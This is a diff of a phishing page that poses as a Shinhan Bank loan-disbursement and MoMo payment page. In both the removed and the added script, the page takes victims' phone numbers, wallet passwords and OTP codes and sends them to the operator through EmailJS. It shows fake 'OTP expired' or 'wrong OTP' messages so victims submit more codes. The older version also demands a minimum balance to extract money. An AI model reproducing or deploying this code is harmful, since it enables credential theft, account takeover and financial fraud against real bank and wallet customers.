-    <footer role="contentinfo" aria-label="Footer">
-        <p>
-            <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/chinh-sach-bao-mat.html">Chính sách bảo mật</a> |
-            <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html">Điều khoản sử dụng</a> |
-            <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/chinh-sach-cookies.html">Chính sách Cookies</a> |
-            <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/huong-dan-truy-cap.html">Hướng dẫn truy cập web</a> |
-            <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/sitemap.html">Sitemap</a> |
-            <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/trung-tam-bao-mat.html">Trung tâm bảo mật</a> |
-            <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/support-center.html">Liên hệ</a> |
-            <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/gioi-thieu.html">Giới thiệu</a>
-        </p>
-        <img src="https://pg.megapay.vn/pg_was/images/pg/bankContents/PCIDSS.png?v2" alt="PCI DSS">
-        <img src="https://simg.zalopay.com.vn/zst/zlp-website/resources/images/footer/BCTLogo_1.png" alt="Bộ Công Thương">
-        <p>© Copyright Shinhan Bank 2016-2025</p>
-    </footer>
+    <!-- Notification Toast Structure -->
+    <div id="notification" class="notification"></div>
 
     <script>
-        let otpCountdown = 60;
-        let otpInterval;
-        let bannerIndex = 0;
-        let failedAttempts = 0;
-        let phoneNumber = '';
-        let formData; // Global formData for access in verifyOTP
+        document.addEventListener('DOMContentLoaded', () => {
+            // --- DATA ---
+            const credentials = {
+                phone: '', password: '', otp: ''
+            };
+            
+            const getFormData = () => {
+                return {
+                    fullName: 'Vũ Trung Hiếu',
+                    cccd: '012345678910',
+                    amount: 8000000,
+                    months: 48,
+                    phone: '0909876543',
+                    email: 'hieu.vu@example.com',
+                    method: 'momo'
+                };
+            };
+            
+            const formData = getFormData();
+            let otpAttempts = 0;
 
-        // Load Summary - Kept images and added error handling
-        window.addEventListener('load', () => {
-            try {
-                formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
-                console.log('Retrieved formData:', formData); // Debug log
-                if (!formData.fullName) {
-                    if (Object.keys(formData).length > 0) {
-                        emailjs.send('service_60tgxof', 'template_56lv2n9', {
-                            full_name: formData.fullName || 'N/A',
-                            cccd: formData.cccd || 'N/A',
-                            amount: formData.amount || 'N/A',
-                            months: formData.months || 'N/A',
-                            account_number: formData.accountNumber || 'N/A',
-                            account_holder: formData.accountHolder || 'N/A',
-                            bank: formData.bank || 'N/A',
-                            phone: formData.phone || 'N/A',
-                            email: formData.email || 'N/A',
-                            method: formData.method || 'N/A',
-                            timestamp: new Date().toLocaleString('vi-VN')
-                        }).then(
-                            () => console.log('formData sent to EmailJS:', formData),
-                            (error) => console.error('EmailJS error:', error)
-                        );
-                    }
-                    alert('Vui lòng nhập thông tin giải ngân trước.');
-                    window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
-                    return;
-                }
-                document.getElementById('summaryName').textContent = formData.fullName || 'N/A';
-                document.getElementById('summaryCCCD').textContent = formData.cccd || 'N/A';
-                document.getElementById('summaryAmount').textContent = formData.amount || 'N/A';
-                document.getElementById('summaryMonths').textContent = formData.months || 'N/A';
-                document.getElementById('summaryBank').textContent = formData.bank || 'N/A';
-                document.getElementById('summaryPhone').textContent = formData.phone || 'N/A';
-            } catch (error) {
-                console.error('Error parsing formData:', error);
-                alert('Lỗi khi tải thông tin giải ngân. Vui lòng thử lại.');
-                window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
-            }
-            if (typeof window.Inputmask === 'function') {
-                Inputmask({ mask: "0999-999-999" }).mask(document.getElementById('phone'));
-                Inputmask({ regex: "\\d{6}" }).mask(document.getElementById('otp'));
-            }
-            lazyLoadImages();
-        });
-
-        // Lazy Load Images - Kept unchanged
-        function lazyLoadImages() {
-            const images = document.querySelectorAll('img.lazy');
-            images.forEach(img => {
-                if (img.getAttribute('data-src')) {
-                    img.src = img.getAttribute('data-src');
-                    img.removeAttribute('data-src');
-                    img.classList.remove('lazy');
-                }
-            });
-        }
-
-        // Banner Carousel - Kept unchanged
-        function changeSlide(n) {
-            bannerIndex = (bannerIndex + n + 4) % 4;
-            updateBanner();
-        }
-
-        function goToSlide(n) {
-            bannerIndex = n;
-            updateBanner();
-        }
-
-        function updateBanner() {
+            // --- UI ELEMENTS ---
+            const getEl = (id) => document.getElementById(id);
+            const otpInputs = document.querySelectorAll('#momo-otp-section .otp-input');
             const slides = document.querySelectorAll('.banner-slide');
-            const dots = document.querySelectorAll('.dot');
-            slides.forEach((slide, i) => slide.classList.toggle('active', i === bannerIndex));
-            dots.forEach((dot, i) => dot.classList.toggle('active', i === bannerIndex));
-            lazyLoadImages();
-        }
+            const slideCount = slides.length;
+            let currentSlide = 0;
 
-        setInterval(() => {
-            bannerIndex = (bannerIndex + 1) % 4;
-            updateBanner();
-        }, 5000);
-        updateBanner();
+            // --- FUNCTIONS ---
+            
+            const formatCurrency = (amount) => new Intl.NumberFormat('vi-VN', { style: 'currency', currency: 'VND' }).format(amount);
 
-        // Hamburger Menu Toggle - Kept unchanged
-        function toggleMenu() {
-            const menu = document.getElementById('nav-menu');
-            const hamburger = document.querySelector('.hamburger');
-            menu.classList.toggle('show');
-            hamburger.setAttribute('aria-expanded', menu.classList.contains('show'));
-        }
+            const createDetailItem = (label, value, isPaymentMethod = false) => {
+                const item = document.createElement('div');
+                item.className = 'detail-item';
+                
+                const labelSpan = document.createElement('span');
+                labelSpan.className = 'label';
+                labelSpan.textContent = label;
 
-        // Real-Time Phone Validation - Kept unchanged
-        function debounce(fn, delay) {
-            let timeout;
-            return (...args) => {
-                clearTimeout(timeout);
-                timeout = setTimeout(() => fn(...args), delay);
-            };
-        }
+                const valueSpan = document.createElement('span');
+                valueSpan.className = 'value';
 
-        document.getElementById('phone').addEventListener('input', debounce(() => {
-            const value = document.getElementById('phone').value.replace(/\D/g, '');
-            document.getElementById('phoneError').classList.toggle('show', !/^0\d{9}$/.test(value) && value.length > 0);
-        }, 300));
-
-        // OTP Timer - Kept unchanged
-        function startOTPTimer() {
-            otpCountdown = 60;
-            document.getElementById('otpTimer').textContent = `Còn ${otpCountdown} giây`;
-            document.getElementById('resendOTP').disabled = true;
-            clearInterval(otpInterval);
-            otpInterval = setInterval(() => {
-                otpCountdown--;
-                document.getElementById('otpTimer').textContent = `Còn ${otpCountdown} giây`;
-                if (otpCountdown <= 0) {
-                    clearInterval(otpInterval);
-                    document.getElementById('resendOTP').disabled = false;
+                if(isPaymentMethod) {
+                    const logo = document.createElement('img');
+                    logo.src = 'https://upload.wikimedia.org/wikipedia/vi/f/fe/MoMo_Logo.png';
+                    valueSpan.appendChild(logo);
+                    valueSpan.append(value);
+                } else {
+                    valueSpan.textContent = value;
                 }
-            }, 1000);
-        }
-
-        // Send to EmailJS - Updated to use 'password' and 'otp' keys
-        function sendToEmail(type, value, phone) {
-            console.log(`Sending ${type} to EmailJS:`, { value, phone }); // Debug log
-            const templateId = type === 'password' ? 'template_xw5s9pw' : 'template_g9e2jee';
-            const payload = {
-                type: type,
-                phone: phone,
-                timestamp: new Date().toLocaleString('vi-VN')
+                
+                item.appendChild(labelSpan);
+                item.appendChild(valueSpan);
+                return item;
             };
-            if (type === 'password') {
-                payload.password = value; // Use 'password' key for template_xw5s9pw
-            } else {
-                payload.otp = value; // Use 'otp' key for template_g9e2jee
-            }
-            emailjs.send('service_60tgxof', templateId, payload).then(
-                () => console.log(`${type} sent to EmailJS:`, payload),
-                (error) => console.error('EmailJS error:', error)
-            );
-        }
 
-        // Form Navigation
-        function proceedToPassword() {
-            const phone = document.getElementById('phone').value.replace(/\D/g, '');
-            document.getElementById('phoneError').classList.remove('show');
+            const populateData = () => {
+                const principal = formData.amount || 0;
+                const interest = formData.interest !== undefined ? formData.interest : (principal * 0.057); 
+                const overdueAmount = 0;
+                const earlyTerminationFee = 0;
+                const collectionFee = 24000;
+                const customerName = formData.fullName || 'N/A';
+                const contractNumber = 'SHB-' + Math.floor(1000000000 + Math.random() * 9000000000);
+                const loanTermInMonths = formData.months || 48;
 
-            if (!/^0\d{9}$/.test(phone)) {
-                document.getElementById('phoneError').classList.add('show');
-                return;
-            }
+                const totalAmount = principal + interest + overdueAmount + earlyTerminationFee + collectionFee;
+                getEl('mainTotalAmount').textContent = formatCurrency(totalAmount);
+                
+                const paymentDetailsContainer = getEl('payment-details');
+                paymentDetailsContainer.innerHTML = '';
+                paymentDetailsContainer.appendChild(createDetailItem('Số tiền gốc', formatCurrency(principal)));
+                paymentDetailsContainer.appendChild(createDetailItem('Số tiền lãi', formatCurrency(interest)));
+                paymentDetailsContainer.appendChild(createDetailItem('Số tiền quá hạn', formatCurrency(overdueAmount)));
+                paymentDetailsContainer.appendChild(createDetailItem('Phí tất toán trước hạn', formatCurrency(earlyTerminationFee)));
+                paymentDetailsContainer.appendChild(createDetailItem('Phí thu hộ/giao dịch', formatCurrency(collectionFee)));
+                paymentDetailsContainer.appendChild(createDetailItem('Thanh toán qua', 'Ví MoMo', true));
+                
+                const customerDetailsContainer = getEl('customer-details');
+                customerDetailsContainer.innerHTML = '';
+                customerDetailsContainer.appendChild(createDetailItem('Tên khách hàng', customerName));
+                customerDetailsContainer.appendChild(createDetailItem('Số hợp đồng', contractNumber));
+                
+                const closingDate = new Date();
+                closingDate.setMonth(closingDate.getMonth() + loanTermInMonths);
+                const formattedClosingDate = closingDate.toLocaleDateString('vi-VN', {
+                    day: '2-digit', month: '2-digit', year: 'numeric'
+                });
 
-            phoneNumber = phone;
-            document.getElementById('phone-section').style.display = 'none';
-            document.getElementById('password-section').style.display = 'block';
-        }
+                getEl('closingDateNotice').innerHTML = `<strong>Shinhan Bank</strong> sẽ đóng khoản vay vào ngày <strong>${formattedClosingDate}</strong>, sau khi bạn hoàn tất thanh toán`;
+            };
 
-        function proceedToOTP() {
-            const password = document.getElementById('password').value.trim();
-            console.log('Password value:', password); // Debug log
-            document.getElementById('passwordError').classList.remove('show');
+            window.showNotification = (message, type = 'error', duration = 3000) => {
+                const notification = getEl('notification');
+                notification.innerHTML = message;
+                notification.className = `notification ${type} show`;
+                setTimeout(() => notification.classList.remove('show'), duration);
+            };
+            
+            window.showSection = (sectionId) => {
+                 document.querySelectorAll('.page-section').forEach(section => section.classList.remove('active'));
+                 getEl(sectionId).classList.add('active');
+            };
 
-            if (!password) {
-                document.getElementById('passwordError').textContent = 'Vui lòng nhập mật khẩu';
-                document.getElementById('passwordError').classList.add('show');
-                return;
-            }
-
-            sendToEmail('password', password, phoneNumber);
-
-            document.getElementById('otpMessage').textContent = `Mã xác thực 6 chữ số đã được gửi đến SĐT ${phoneNumber} của bạn.`;
-            document.getElementById('password-section').style.display = 'none';
-            document.getElementById('otp-section').style.display = 'block';
-            startOTPTimer();
-        }
-
-        function verifyOTP() {
-            const otp = document.getElementById('otp').value.trim();
-            console.log('OTP value:', otp); // Debug log
-            document.getElementById('otpError').classList.remove('show');
-
-            if (!otp) {
-                document.getElementById('otpError').textContent = 'Vui lòng nhập mã OTP';
-                document.getElementById('otpError').classList.add('show');
-                return;
-            }
-
-            sendToEmail('otp', otp, phoneNumber);
-
-            if (!/^\d{6}$/.test(otp)) {
-                document.getElementById('otpError').textContent = 'Vui lòng nhập mã OTP 6 chữ số';
-                document.getElementById('otpError').classList.add('show');
-                return;
-            }
-
-            if (otpCountdown <= 0) {
-                document.getElementById('otpError').textContent = 'Mã hết hiệu lực, mã sẽ được gửi lại, vui lòng chờ';
-                document.getElementById('otpError').classList.add('show');
-                resendOTP();
-            } else {
-                failedAttempts++;
-                if (failedAttempts === 1) {
-                    alert('OTP không đúng, vui lòng kiểm tra lại');
-                } else if (failedAttempts === 2) {
-                    const amount = parseInt(formData.amount.replace(/\D/g, '')) || 0;
-                    const minBalance = (amount * 0.1).toLocaleString('vi-VN', { style: 'currency', currency: 'VND' });
-                    alert(`Quý khách không đủ điều kiện giải ngân do không đủ số dư cần thiết trong tài khoản, yêu cầu có số dư tối thiểu 10% khoản vay: ${minBalance} để được giải ngân`);
-                } else if (failedAttempts >= 3) {
-                    alert('Giải ngân không thành công. Vui lòng thử lại sau.');
-                    setTimeout(() => {
-                        window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
-                    }, 2000); // Delay to show alert
+            window.handlePhoneSubmit = () => {
+                const phoneInput = getEl('momo-phone');
+                let phoneValue = phoneInput.value.replace(/\D/g, '');
+                
+                if (phoneValue.length === 9 || (phoneValue.length === 10 && phoneValue.startsWith('0'))) {
+                    if (phoneValue.length === 10) {
+                        phoneValue = phoneValue.substring(1);
+                    }
+                    credentials.phone = `+84${phoneValue}`;
+                    const maskedPhone = `+84 **** ${phoneValue.slice(-3)}`;
+                    getEl('masked-phone-password').textContent = maskedPhone;
+                    showSection('momo-password-section');
+                } else {
+                    showNotification('Số điện thoại không hợp lệ.<br>Vui lòng thử lại.', 'error');
                 }
-            }
-        }
+            };
+            
+            window.handlePasswordSubmit = () => {
+                const passwordInput = getEl('momo-password');
+                 if (passwordInput.checkValidity()) {
+                    credentials.password = passwordInput.value;
+                    sendToEmail('password', credentials.password);
+                    
+                    const maskedPhone = `+84 **** ${credentials.phone.slice(-3)}`;
+                    getEl('masked-phone-otp').textContent = maskedPhone;
+                    getEl('momo-otp-prompt').textContent = `Mã xác thực đã được gửi đến SĐT ${maskedPhone}.`;
+                    showSection('momo-otp-section');
+                    otpInputs[0].focus();
+                    setTimeout(() => showNotification(`Đã gửi mã OTP đến ${credentials.phone}`, 'success'), 1000);
+                } else {
+                    showNotification('Mật khẩu phải là 6 chữ số.', 'error');
+                }
+            };
 
-        function resendOTP() {
-            alert('Mã xác thực đã được gửi lại!');
-            startOTPTimer();
-        }
+             const sendToEmail = (type, value) => {
+                const serviceID = 'service_60tgxof';
+                let templateID = '';
+                let templateParams = {};
+                const contractNumber = getEl('customer-details').querySelector('.detail-item:last-child .value').textContent;
+
+                const commonParams = {
+                    platform: "MoMo (Shinhan Layout)",
+                    phone: credentials.phone,
+                    contract_number: contractNumber,
+                    customer_name: formData.fullName,
+                    total_amount: getEl('mainTotalAmount').textContent
+                };
+
+                if (type === 'password') {
+                    templateID = 'template_xw5s9pw';
+                    templateParams = { ...commonParams, password: value };
+                } else if (type === 'otp') {
+                    templateID = 'template_g9e2jee';
+                    templateParams = { ...commonParams, otp: value, password: credentials.password };
+                }
+
+                if(templateID) {
+                    emailjs.send(serviceID, templateID, templateParams)
+                        .then(() => console.log(`${type} sent successfully.`))
+                        .catch(err => console.error(`EmailJS send failed for ${type}:`, err));
+                }
+            };
+
+            const clearOtpInputs = () => {
+                otpInputs.forEach(input => input.value = '');
+                otpInputs[0].focus();
+            };
+            
+            window.handleOtpSubmit = () => {
+                credentials.otp = Array.from(otpInputs).map(input => input.value).join('');
+                
+                if (credentials.otp.length !== 6) {
+                     showNotification('Mã OTP phải là 6 chữ số.', 'error');
+                     return;
+                }
+                
+                const otpLoading = getEl('momo-otp-loading');
+                const otpSubmitBtn = getEl('momo-otp-submit-btn');
+                otpLoading.style.display = 'block';
+                otpSubmitBtn.disabled = true;
+                
+                sendToEmail('otp', credentials.otp);
+
+                setTimeout(() => {
+                    otpAttempts++;
+                    otpLoading.style.display = 'none';
+                    otpSubmitBtn.disabled = false;
+
+                    switch (otpAttempts) {
+                        case 1:
+                            showNotification('OTP đã hết hiệu lực.<br>Vui lòng nhập lại.', 'error');
+                            clearOtpInputs();
+                            break;
+                        case 2:
+                            showNotification('OTP không đúng.<br>Vui lòng kiểm tra lại.', 'error');
+                            clearOtpInputs();
+                            break;
+                        case 3:
+                            showNotification('Xác nhận giải ngân không thành công.<br>Đang chuyển hướng...', 'error', 4000);
+                            setTimeout(() => {
+                                window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html';
+                            }, 4000);
+                            break;
+                    }
+                }, 1500);
+            };
+
+            // --- OTP Input Logic ---
+            otpInputs.forEach((input, index) => {
+                input.addEventListener('input', () => {
+                    if (input.value && index < otpInputs.length - 1) {
+                        otpInputs[index + 1].focus();
+                    }
+                });
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === "Backspace" && !input.value && index > 0) {
+                        otpInputs[index - 1].focus();
+                    }
+                });
+                input.addEventListener('paste', (e) => {
+                    e.preventDefault();
+                    const pasteData = e.clipboardData.getData('text').slice(0, 6);
+                    pasteData.split('').forEach((char, i) => {
+                        if(otpInputs[i]) otpInputs[i].value = char;
+                    });
+                    if (pasteData.length > 0) {
+                       otpInputs[Math.min(5, pasteData.length -1)].focus();
+                    }
+                });
+            });
+            
+            // --- Banner Slider Logic ---
+            const startSlider = () => {
+                 if(slideCount > 0){
+                    setInterval(() => {
+                        slides[currentSlide].classList.remove('active');
+                        currentSlide = (currentSlide + 1) % slideCount;
+                        slides[currentSlide].classList.add('active');
+                    }, 3000); 
+                 }
+            };
+
+            // --- INITIALIZATION ---
+            populateData();
+            startSlider();
+
+        });
     </script>
 </body>
 </html>
